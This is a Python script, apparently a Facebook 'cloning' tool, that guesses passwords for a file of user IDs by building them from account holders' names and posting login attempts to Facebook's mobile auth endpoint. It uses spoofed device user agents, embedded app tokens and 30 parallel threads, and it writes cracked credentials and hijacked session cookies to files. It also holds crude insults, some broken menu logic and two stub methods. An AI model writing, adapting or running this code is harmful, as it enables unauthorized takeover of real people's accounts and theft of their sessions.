#coding = utf-8
#This Open-Source Script by Aqib Gando ghasti ka bacha
#Please Donot Forget to give Credit 
#Whatsapp : +
import os
import sys
import re
import random,zlib
import time
from time import sleep as sp
import string,json
import subprocess
import base64,uuid
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpd
 
 
try:
	import requests
except ImportError:
	os.system('pip install requests')
 
 
ses = requests.Session()
 
id = []
ok = []
cp =[]
loop = 0
pwx = []
method = []
 
 
##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'

print("EssA")

#________________________________________#
def clear():
	os.system("clear")
 
def line():
	print(52*'-')
def p(x):
	print(x)
 
def logo():
	logo = (f'''\033[1;97m                                    
@@@@@@@   @@@  @@@       @@@  @@@  @@@@@@@  @@@@@@@@  
@@@@@@@@  @@@  @@@       @@@  @@@  @@@@@@@  @@@@@@@@  
@@!  @@@  @@!  @@!       @@!  @@@    @@!    @@!       	
\033[1;96m!@!  @!@  !@!  !@!       !@!  @!@    !@!    !@!       
@!@  !@!  !!@  @!!       @!@  !@!    @!!    @!!!:!    
\033[1;97m!@!  !!!  !!!  !!!       !@!  !!!    !!!    !!!!!:    
!!:  !!!  !!:  !!:       !!:  !!!    !!:    !!:       
:!:  !:!  :!:   :!:      :!:  !:!    :!:    :!:       
 :::: ::   ::   :: ::::  ::::: ::     ::     :: ::::  
:: :  :   :    : :: : :   : :  :      :     : :: ::   
[<>] The Original Codes are Written by Dilute Codes
---------------------------------------------------
 ╰◈▪➣ Github    : https://github.com/Dilute Codes
 ╰◈▪➣ Facebook  : 033[92;1m
 ╰◈▪➣ Author    : fat condem ka nateeja = Dilute Codes( Ghasti maa ka Beta )
 ╰◈▪➣ Version   : DC Extreme [2.2]
 ╰◈▪➣   \033[1;96mNaam Ki Dosti Kaam ki Yaari\n\tDosron Ki Tarah ! Adat Nhi Hamari \033[1;97m
---------------------------------------------------''')
	p(logo)
 
 
ua3 = "YAHN APNY 3RD USER AGENT LGANY HE "
 
 
 
ua2 = ' YH 2ND USERAGENTS LGALO METHOD 2 KY LIYE'
 
# USER AGENT FUNCTION UA 1 METHOD 1
def iAmAndroidUa():
	# YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 11; Tv Hub Mini Build/RTT0.210618.003)","Dalvik/2.1.0 (Linux; U; Android 9.0; S108 Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 11; Orb S Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ3A.230605.011)","Dalvik/2.1.0 (Linux; U; Android 12; MP0101635 Build/SQ1D.211205.016.A5)","Dalvik/2.1.0 (Linux; U; Android 5.1; Panasonic T30 Build/Panasonic-T30)","Dalvik/2.1.0 (Linux; U; Android 11; dedede Build/R114-15437.42.0)","Dalvik/2.1.0 (Linux; U; Android 12; W2 Build/RD2A.211001.002)","Dalvik/2.1.0 (Linux; U; Android 13; SM-T733 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; M2102J20SG Build/SKQ1.211006.001)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; LM-X510.FG Build/O00623)","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SG32.39-181)","Dalvik/2.1.0 (Linux; U; Android 11; zork Build/R114-15437.42.0)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus (2022) Build/S3RDES32.123-37-4-1)","Dalvik/2.1.0 (Linux; U; Android 9; KFMUWI Build/PS7327.3329N)","Dalvik/2.1.0 (Linux; U; Android 13; RMX3741 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; Nubia 4010 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 9.1; HF-16CJ Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)","Dalvik/2.1.0 (Linux; U; Android 11; MID4G64PR002 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 10; moto g(9) play Build/QPX30.30-Q3-38-72)Dalvik/2.1.0 (Linux; U; Android 9; ZC-339 Build/PI)","Dalvik/2.1.0 (Linux; U; Android 13; Infinix X6716B Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; STG_C10 Build/P00610)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ3A.230605.011)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-T560NU Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 13; 22041219G Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; motorola razr 40 ultra Build/T1TZ33.3-62-25)","Dalvik/2.1.0 (Linux; U; Android 11; TC21 Build/11-20-18.00-RG-U00-STD-HEL-04)","Dalvik/2.1.0 (Linux; U; Android 11; SUGAR C60 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X665C Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; SO-53C Build/63.1.B.1.113)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; LIONS1 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 9; Neffos X20 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8T Build/RKQ1.201004.002)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A326U Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; NX669J Build/SKQ1.220502.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; vivo 1718 Build/OPM1.171019.026)","Dalvik/2.1.0 (Linux; U; Android 12; M2103K19G Build/SP1A.210812.016)"," Dalvik/2.1.0 (Linux; U; Android 10; SMART_L104_eea Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 10; Motorola Defy Build/QZD30.62)","Dalvik/2.1.0 (Linux; U; Android 12; moto g32 Build/S2SNS32.34-60-7)","Dalvik/2.1.0 (Linux; U; Android 12; Android SDK built for x86_64 Build/SE1A.220621.001)","Dalvik/2.1.0 (Linux; U; Android 12; RMX3627 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; Acer Chromebook R13 (CB5-312T) Build/R114-15437.42.0)","Android 10; Titan_1 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 9; AEOAT Build/PS7559.3533N)","Dalvik/2.1.0 (Linux; U; Android 12; itel A631L Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; AEOAT Build/PS7504.3919N)","Dalvik/2.1.0 (Linux; U; Android 11; V11 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 12; OPD2102A Build/RKQ1.211119.001)","Dalvik/2.1.0 (Linux; U; Android 10; 4you Galaxy Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 11; Telenor Mediahubb Build/RTT4.230210.001)","Dalvik/2.1.0 (Linux; U; Android 10; MAR-LX1A Build/HUAWEIMAR-L21A)","Dalvik/2.1.0 (Linux; U; Android 9; Nexus Player Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 13; SC-56B Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; 2K SMART TV Build/RTM6.230109.061)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11AG Build/TQ2A.230305.008.C1)","Dalvik/2.1.0 (Linux; U; Android 13; 2201117TL Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 13; 2210129SG Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 40 pro Build/T1TR33.43-20-5)","Dalvik/2.1.0 (Linux; U; Android 13; PFTM20 Build/TP1A.220905.001)",])+END
	return ua
 
	
class Main:
	def __init__(self):
		os.system('clear')
	def saved_results(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			p('\n')
			line()
			p(' [•] Cloning Process Has Been Completed ')
			p(' [•] Total OK Accounts : %s '%(len(ok)))
			p(' [•] Total CP Accounts : %s '%(len(cp)))
			line()
			input(' [•] Press Enter To Go Back To Main Menu ')
			self.menu()
	def menu(self):
		logo()
		p(' [•] This Script is Free Open-Souce by Minahil  ')
		line()
		p(' [1] File Cracking ')
		p(" [2] Join Dilute Coders Facebook Group ")
		p(' [3] Join Dilute Coders Whatsapp Group ')
		line()
		m_1 = input(' [•] Choose : ')
		if m_1 == '1':
			self.methods_menu()
		elif m_1 == '2':
			os.system('xdg-open https://facebook.com/groups/124939013896146/')
			sp(1)
			self.menu()
		elif m_2 =='3':
			os.system('xdg-open https://chat.whatsapp.com/GzUiQ51HrLpDzebhrmsgYh')
		else:
			p(' [•] Wrong Select Hai Bhosdikay ')
			sp(1)
			self.menu()
	def methods_menu(self):
		line()
		p(' [1] Method 1 \n [2] Method 2 \n [3] Method 3')
		line()
		m_2 = input(' [•] Select Method : ')
		if m_2 == '1':
			method.append('i')
			self.cracking()
		elif m_2 == '2':
			method.append('ii')
			self.cracking()
		elif m_2 == '3':
			method.append('iii')
			self.cracking()
		else:
			p(' [•] Wrong Select Hai Bhosdikay ')
			sp(1)
			self.methods_menu()
 
	def cracking(self):
		clear()
		logo()
		try:
			file = input(' [•] Put File Path : ')
			id = open(file).read().splitlines()
			self.password_menu(id)
		except FileNotFoundError:
			p(' [X] File Path Wrong....')
			sp(2)
			self.cracking()
 
	def password_menu(self,id):
		clear()
		logo()
		p(' [•] Enter Password Limit Between 1 to 20 (Max) ')
		try:
			plimit = int(input(' [•] Put Limit : '))
			if plimit == '':
				plimit = 4
			elif plimit > 20:
				limit = 10
		except:
			plimit = 4
		clear();logo()
		print(' [•] Example : first123,last1122,firstlast,last Etc ')
		for n in range(plimit):
			pwx.append(input(' [•] Put Password %s : '%(n+1)))
		clear();logo()
		p(' [•] Dilute Brute Has Been Started ')
		line()
		p(' [•] Total Clone Accounts :  %s '%(len(id)))
		line()
		p(' [•] Use Flight ( Jahaz ) Mode Before / During Cloning ')
		line()
		with tpd(max_workers=30) as saqi:
			for user in id:
				uid,nm = user.split('|')
				if 'i' in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif 'ii' in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif 'iii' in method:
					saqi.submit(self.method3,uid,nm,pwx)
		self.saved_results(ok,cp)
 
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [AQIB] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": pw,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmAndroidUa(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[AQIB-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/AQIB_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/AQIB_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[AQIB-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/AQIB_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.method1(uid,nm,pwx)
 
	def method2(self,uid,nm,pwx):
		#YE METHOD 2 HE
		print(" [ METHOD 2] YHN AP 2ND METHOD LGALO ...")
		exit()
 
	def method3(self,uid,nm,pwx):
		#YE METHOD 3 HE
		print(" [ METHOD 3 ] YHN AP 3RD METHOD LGALO ...")
		exit()
 
		exit()
if __name__=="__main__":
	Main().menu()
 
